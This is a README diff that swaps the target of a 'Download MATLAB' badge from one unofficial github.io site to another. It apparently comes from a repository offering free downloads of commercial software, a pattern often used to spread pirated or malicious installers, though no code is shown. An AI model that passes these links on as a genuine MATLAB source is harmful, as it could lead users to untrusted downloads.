@@ -2,7 +2,7 @@
 
 ## 📥 Download MATLAB
 
-[![⬇️ Download MATLAB](https://img.shields.io/badge/Download-MATLAB-blue?style=for-the-badge&logo=mathworks)](https://matlab-simulation-download.github.io/.github)
+[![⬇️ Download MATLAB](https://img.shields.io/badge/Download-MATLAB-blue?style=for-the-badge&logo=mathworks)](https://matlab-plus.github.io/.github)
 
 ---
 
